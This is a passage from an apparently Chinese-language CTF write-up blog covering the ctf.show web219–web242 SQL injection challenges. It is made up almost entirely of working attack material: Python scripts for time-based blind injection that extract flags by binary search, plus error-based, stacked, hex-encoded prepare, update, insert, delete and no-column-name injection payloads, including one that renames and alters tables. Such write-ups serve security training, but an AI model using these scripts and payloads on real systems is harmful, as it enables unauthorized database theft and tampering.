&quot;http://8121f42d-c9da-4307-94b0-c7345a92f907.challenge.ctf.show/api/&quot;ans = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    j = 0    while head &lt; tail:        j += 1        #算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差        time.sleep(6)        mid = (head + tail) &gt;&gt; 1        #表名 ctfshow_flagxc        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        #字段名 flagaabc        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39;&quot;        # 数据 防止查错咱们多等会呗 我直接就查一个        payload = &quot;select flagaac from ctfshow_flagxc&quot;        #ctfshow&#123;2d33427a-d593-4d42-85a2-a459a676b1b0&#125;        data = &#123;            &#39;ip&#39; :f&quot;1) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1)))&gt;&#123;mid&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;,            &#39;debug&#39; : &#39;0&#39;        &#125;        try:            r = requests.post(url , data= data ,timeout=1)            #time.sleep(0.3)            tail = mid        except Exception as e:            head = mid +1    if head != 32:        ans += chr(head)    else:        break    print(ans)</code></pre><h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408172145807.png" alt="image-20220408172145807"></p><pre><code class="python">import requestsimport timeurl = &quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;ans = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    j = 0    while head &lt; tail:        j += 1        #算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差        mid = (head + tail) &gt;&gt; 1        #表名 ctfshow_flagxca        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        #字段名 flagaabc        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxca&#39;&quot;        # 数据 防止查错咱们多等会呗 我直接就查一个        payload = &quot;select flagaabc from ctfshow_flagxca&quot;        #ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;        data = &#123;            &#39;ip&#39; :f&quot;1) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1)))&gt;&#123;mid&#125;,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;,            &#39;debug&#39; : &#39;0&#39;        &#125;        try:            r = requests.post(url , data= data ,timeout=1)            #time.sleep(0.3)            head = mid +1        except Exception as e:            tail = mid            time.sleep(6)    if head != 32:        ans += chr(head)    else:        break    print(ans)</code></pre><h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408184439334.png" alt="image-20220408184439334"></p><pre><code class="python">import requestsimport timeurl = &quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;ans = &quot;&quot;j = 1dir = &quot;cfi_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolpQWERTYUIOPASDFGHJKLZXCVBNM&quot;while True:    for i in dir:        ans += i        #表名 ctfshow_flagxcac        #payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;        #字段名 ctfshow_flagxcac        payload = &quot;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxcac&#39; limit 1,1&quot;        # 数据 防止查错咱们多等会呗 我直接就查一个        payload = &quot;select flagaabcc from ctfshow_flagxcac&quot;        #ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;        #print(f&quot;if(ord(left(&#123;payload&#125;,&#123;i&#125;))&gt;&#123;mid&#125;,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;)        data = &#123;            &#39;ip&#39; :f&quot;1) or if((left((&#123;payload&#125;),&#123;j&#125;))=&#39;&#123;ans&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;,            &#39;debug&#39; : &#39;0&#39;        &#125;        try:            r = requests.post(url , data= data ,timeout=1)            #time.sleep(0.3)            ans = ans[:-1]            print(&#39;正确&#39;)        except Exception as e:            print(ans)            j += 1            time.sleep(6)            print(&#39;错误&#39;)</code></pre><h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><h2 id="limit报错注入"><a href="#limit报错注入" class="headerlink" title="limit报错注入"></a>limit报错注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211002396.png" alt="image-20220408211002396"></p><p>mysql利用procedure analyse()函数优化表的结构</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211135617.png" alt="image-20220408211135617"></p><pre><code>/api/?page=1&amp;limit=10  procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408212617134.png" alt="image-20220408212617134"></p><p>直接提交这个数据库哦</p><p>还有这个</p><pre><code>/api/?page=1&amp;limit=10  procedure analyse((updatexml(1,concat(0x7e,database(),0x7e),1)),2)</code></pre><h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h2 id="group-by-注入"><a href="#group-by-注入" class="headerlink" title="group by 注入"></a>group by 注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408213246662.png" alt="image-20220408213246662"></p><pre><code>select * from ctfshow_user group by 1,if(1=1,sleep(1),1);</code></pre><pre><code></code></pre><h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408214846588.png" alt="image-20220408214846588"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215003341.png" alt="image-20220408215003341"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215023841.png" alt="image-20220408215023841"></p><p>显然可以盲注</p><p>数字被禁了可以使用true绕过</p><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220113624.png" alt="image-20220408220113624"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220136403.png" alt="image-20220408220136403"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220153265.png" alt="image-20220408220153265"></p><p>重置成admin admin登录一下</p><h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h2 id="堆叠注入-handler读数据"><a href="#堆叠注入-handler读数据" class="headerlink" title="堆叠注入 handler读数据"></a>堆叠注入 handler读数据</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221302428.png" alt="image-20220408221302428"></p><p>没有过滤show</p><pre><code>/api/?username=1&#39;;show databases;&amp;page=1&amp;limit=10</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221705966.png" alt="image-20220408221705966"></p><pre><code>/api/?username=1&#39;;show tables;&amp;page=1&amp;limit=10</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221725973.png" alt="image-20220408221725973"></p><pre><code>/api/?username=1&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;handler ctfshow_flagasa close;&amp;page=1&amp;limit=10</code></pre><p>预处理</p><pre><code>/api/?username=1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39; database()&#39;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10</code></pre><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>mysql将prepare execute deallocate统称为 PREPARE STATEMENT.</p><pre><code>PREPARE name from &#39;[my sql sequece]&#39;;    #预定义sql语句EXECUTE name;                         #执行预定义的sql语句(DEALLOCATE || DROP) PREPARE name;         #珊瑚预定义sql语句     </code></pre><p>字符串定义预处理</p><pre><code>PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;ET @a = 3;SET @b = 4;EXECUTE stmt1 USING @a, @b;</code></pre><p>变量定义预处理sql</p><pre><code>SET @s = &quot;SELECT SQRT(POW(?,2) + POW (?,2)) AS hypotenuse&quot;;PREPARE stmt2 FROM @s;SET @c = 6;ET @d = 8;EXECUTE stmt2 USING @c,@d;DEALLOCATE PREPARE stmt2;</code></pre><h3 id="常规堆叠注入"><a href="#常规堆叠注入" class="headerlink" title="常规堆叠注入"></a>常规堆叠注入</h3><p>习惯扫目录,没扫到</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151506062.png" alt="image-20220315150640013"></p><p>输入单引号,报错得出数据库mariadb </p><pre><code>1&#39; or 1=1#回显正常</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151507620.png" alt="image-20220315150758543"></p><pre><code>1&#39; order by 3#报错</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510055.png" alt="image-20220315151004003"></p><pre><code>1&#39; order by 2#正常</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510359.png" alt="image-20220315151033307"></p><pre><code>-1&#39; union select 1,2#发现有过滤</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151511268.png" alt="image-20220315151126218"></p><p>大小写也绕不过</p><p>那么只能堆叠注入了</p><pre><code>1&#39;;show databases;#</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151513103.png" alt="image-20220315151331036"></p><pre><code>11&#39;;show tables;#</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151514104.png" alt="image-20220315151416056"></p><p>这里查看一个flag在那个字段里</p><pre><code>1&#39;;desc `1919810931114514`;#</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151516959.png" alt="image-20220315151658903"></p><p>查一下下一个</p><pre><code>1&#39;;desc `words`;# 这里也可以不加`` </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151519393.png" alt="image-20220315151902329"></p><p>那么这里面的id就有可能是我们查询时输入的值了,他的查询语句就可能是</p><pre><code>select id,data from words where id=&#39;&#39;</code></pre><p>如果是这样的话,我们就可以将这里的words替换成1919810931114514将flag替换成id从而实现获取数据.那么可以将1919810931114514改名为words,在这之前需要先将words改下名,改成别的如word1.将flag改成data.但是在1919810931114514并没有id这个列名,那么我们可以给他添加一组id.</p><pre><code>1&#39;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key; alter table words change flag data varchar(100);#</code></pre><p>接着才查询1</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151529964.png" alt="image-20220315152912904"></p><h3 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h3><p>用法</p><pre><code>SER @tn = &#39;hahaha&#39;;                     #存储表名SET @sql =concat(&#39;select * from &#39;,@tn);    #存储sql语句PREPARE name from @sql;                 #预处理sql语句EXECUTE name;                             #执行预定义sql语句(DEALLOCATE || DROP) PREPARE sqla;         #删除预定义sql</code></pre><p>本题即可利用char()函数将select的ascii码转换成select字符串,接着利用concat()函数进行拼接得到select查询语句从而绕过过滤.或者直接使用concat()函数拼接select来绕过</p><pre><code>char(115,101,108,101,99,116)等价于select&#39;</code></pre><pre><code class="sql">1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE st from @sqli;EXECUTE st;#</code></pre><p>或者</p><pre><code class="sql">1&#39;;PREPARE st from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE st;#</code></pre><pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39; database()&#39;);PREPARE st from @sqli;EXECUTE st;</code></pre><pre><code>/api/?username=1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39; database()&#39;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10</code></pre><h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><h2 id="16进制预处理堆叠注入"><a href="#16进制预处理堆叠注入" class="headerlink" title="16进制预处理堆叠注入"></a>16进制预处理堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101024519.png" alt="image-20220409101024519"></p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</code></pre><p>记得十六进制前面加0x哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101420720.png" alt="image-20220409101420720"></p><p>字段名</p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;execute s;&amp;page=1&amp;limit=10</code></pre><p>数据</p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute s;&amp;page=1&amp;limit=10</code></pre><h1 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101938137.png" alt="image-20220409101938137"></p><p>这道题考点其实是查看MySQL的存储过程.看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a>.我们去查information_schema.routines表</p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute s;&amp;page=1&amp;limit=10</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102115511.png" alt="image-20220409102115511"></p><h1 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h1><p>和226差不多</p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102337468.png" alt="image-20220409102337468"></p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c61676173616127;execute s;&amp;page=1&amp;limit=10</code></pre><pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;execute s;&amp;page=1&amp;limit=10</code></pre><h1 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102757765.png" alt="image-20220409102757765"></p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</code></pre><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727;execute s;&amp;page=1&amp;limit=10</code></pre><pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c6167617362612066726f6d20666c6167;execute s;&amp;page=1&amp;limit=10</code></pre><h1 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103050744.png" alt="image-20220409103050744"></p><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</code></pre><pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c6167616162627827;execute s;&amp;page=1&amp;limit=10</code></pre><pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;execute s;&amp;page=1&amp;limit=10</code></pre><h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h2 id="updata注入"><a href="#updata注入" class="headerlink" title="updata注入"></a>updata注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103315126.png" alt="image-20220409103315126"></p><pre><code>update ctfshow_user set pass = &#39;&#123;$password&#125;&#39; where username = &#39;&#123;$username&#125;&#39;;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103537495.png" alt="image-20220409103537495"></p><p>还是这里找发送参数</p><p>简单闭合一下</p><pre><code>update ctfshow_user set pass = &#39;1&#39;,username=user() where 1=1#&#39; where username = &#39;1&#39;;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103848475.png" alt="image-20220409103848475"></p><pre><code>POSTpassword=1&#39;,username=user()#&amp;username=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103833385.png" alt="image-20220409103833385"></p><pre><code>POSTpassword=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) #&amp;username=1</code></pre><pre><code>POSTpassword=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;)#&amp;username=1</code></pre><pre><code>POSTpassword=1&#39;,username=(select flagas from flaga)#&amp;username=1password=1&#39;,username=(select a from (select group_concat(flagas)a from flaga) 1) ;#&amp;username=1</code></pre><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409104334331.png" alt="image-20220409104334331"></p><pre><code>POSTpassword=1&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105435149.png" alt="image-20220409105435149"></p><pre><code>POSTpassword=1&#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;)#&amp;username=1</code></pre><pre><code>password=1&#39;),username=(select flagass from flagaa)#&amp;username=1password=1&#39;),username=(select a from (select group_concat(flagas)a from flaga) 111) ;#&amp;username=1</code></pre><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><h2 id="updata盲注"><a href="#updata盲注" class="headerlink" title="updata盲注"></a>updata盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105751661.png" alt="image-20220409105751661"></p><p>盲注</p><p>测试</p><pre><code class="python">import requestsurl = &quot;http://ad2cbb74-6e31-4f3d-bffc-6d989a5760f7.challenge.ctf.show/api/&quot;payload = &quot;length(database())=0&quot; #没延迟payload = &quot;length(database())&gt;0&quot; #延迟date = &#123;    &#39;username&#39;: f&quot;1&#39; or if(&#123;payload&#125;,sleep(0.05),1) #&quot;,    &#39;password&#39;: &quot;0&quot;&#125;try:    r = requests.post(url, data=date, timeout=0.9)    print(&#39;没延迟&#39;)except Exception as e:    print(&#39;延迟&#39;)</code></pre><pre><code class="python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl = &quot;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&quot;result = &quot;&quot;i = 0while 1:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查表名        # payload = &quot;select column_name from information_schema.columns where table_name=&#39;flag233333&#39; limit 1,1&quot;        # 查数据        payload = &quot;select flagass233 from flag233333&quot;        data = &#123;            &#39;username&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)#&quot;,            &#39;password&#39;: &#39;4&#39;        &#125;        try:            r = requests.post(url, data=data, timeout=0.9)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><h2 id="逃逸字符"><a href="#逃逸字符" class="headerlink" title="\逃逸字符"></a>\逃逸字符</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115745252.png" alt="image-20220409115745252"></p><p>单引号被过滤了,但是可以通过 \ 逃逸字符</p><pre><code>$sql = &quot;update ctfshow_user set pass = &#39;&#123;$password&#125;&#39; where username = &#39;&#123;$username&#125;&#39;;&quot;;</code></pre><p>就像这样,我们给pass传入一个 \ 那么这个’就被转义了</p><pre><code>$sql = &quot;update ctfshow_user set pass = &#39;\&#39; where username = &#39;$username&#39;;&quot;;</code></pre><p>也就是这个才是’\‘ where username &#x3D; ‘pass那么后面的username自然就受我们控制了,比如我们这样闭合</p><pre><code>$sql = &quot;update ctfshow_user set pass = &#39;\&#39; where username = &#39;,username=select database()#&#39;;&quot;;</code></pre><p>,username&#x3D;select database()#这一部分就是我们传入的username的值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115907938.png" alt="image-20220409115907938"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115915740.png" alt="image-20220409115915740"></p><p>传数据库名的时候记得用十六进制哦 ‘’ 被过滤了</p><pre><code>username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#&amp;password=\</code></pre><h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120324788.png" alt="image-20220409120324788"></p><p><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a>   <a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a></p><pre><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120619242.png" alt="image-20220409120611609"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120634772.png" alt="image-20220409120634772"></p><pre><code>username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\</code></pre><p>或者</p><pre><code>username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\</code></pre><h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120851488.png" alt="image-20220409120851488"></p><pre><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120950191.png" alt="image-20220409120950191"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120958493.png" alt="image-20220409120958493"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121038900.png" alt="image-20220409121038900"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121050832.png" alt="image-20220409121050832"></p><h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h2 id="inster注入"><a href="#inster注入" class="headerlink" title="inster注入"></a>inster注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121236464.png" alt="image-20220409121236464"></p><pre><code>username=3&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121533936.png" alt="image-20220409121533936"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121540848.png" alt="image-20220409121540848"></p><pre><code>username=3&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));-- A&amp;password=1</code></pre><pre><code>username=3&#39;,(select flagass23s3 from flag));-- A&amp;password=1</code></pre><h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121935402.png" alt="image-20220409121935402"></p><pre><code>username=3&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122028791.png" alt="image-20220409122028791"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122041955.png" alt="image-20220409122041955"></p><pre><code>username=3&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flagb&#39;)));#&amp;password=1</code></pre><pre><code>username=3&#39;,(select(flag)from(flagb)));#&amp;password=1</code></pre><h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h2 id="过滤or-空格"><a href="#过滤or-空格" class="headerlink" title="过滤or 空格"></a>过滤or 空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123445710.png" alt="image-20220409123445710"></p><pre><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123642991.png" alt="image-20220409123642991"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123657096.png" alt="image-20220409123657096"></p><p>不会查列名</p><pre><code>username=1&#39;,(select(flag)from(flagbb)));#&amp;password=1</code></pre><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409124924898.png" alt="image-20220409124924898"></p><pre><code class="python">import randomimport requestsurl = &quot;http://d9a27e7b-ab91-4d9e-86c7-89a30a22acf3.challenge.ctf.show&quot;url_insert = url + &quot;/api/insert.php&quot;url_flag = url + &quot;/api/?page=1&amp;limit=1000&quot;# 看命函数def generate_random_str():    sttr = &#39;ab&#39;    str_list = [random.choice(sttr) for i in range(5)]    random_str = &#39;&#39;.join(str_list)    return random_strwhile 1:    data = &#123;        &#39;username&#39;: f&quot;1&#39;,(select(flag)from(flag&#123;generate_random_str()&#125;)))#&quot;,        &#39;password&#39;: &quot;&quot;    &#125;    r = requests.post(url_insert, data=data)    r2 = requests.get(url_flag)    if &quot;ctfshow&#123;&quot; in r2.text:        for i in r2.json()[&#39;data&#39;]:            if  &quot;ctfshow&#123;&quot; in i[&#39;pass&#39;]:                print(i[&#39;pass&#39;])                break        break</code></pre><h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409125442979.png" alt="image-20220409125442979"></p><pre><code class="python">&quot;&quot;&quot;Author:feng&quot;&quot;&quot;import requestsfrom time import *def createNum(n):    num = &#39;true&#39;    if n == 1:        return &#39;true&#39;    else:        for i in range(n - 1):            num += &quot;+true&quot;        return numurl=&#39;http://224c4817-ece7-46e4-a9a5-185fdce4e641.chall.ctf.show:8080/api/delete.php&#39;flag=&#39;&#39;for i in range(1,100):    min=32    max=128    while 1:        j=min+(max-min)//2        if min==j:            flag+=chr(j)            print(flag)            if chr(j)==&#39;&#125;&#39;:                exit()            break        #payload=&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)        #payload=&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)        payload=&quot;if(ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)        data=&#123;            &#39;id&#39;:payload        &#125;        try:            r=requests.post(url=url,data=data,timeout=0.2)            min=j        except:            max=j        sleep(0.2)    sleep(1)</code></pre><h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><img 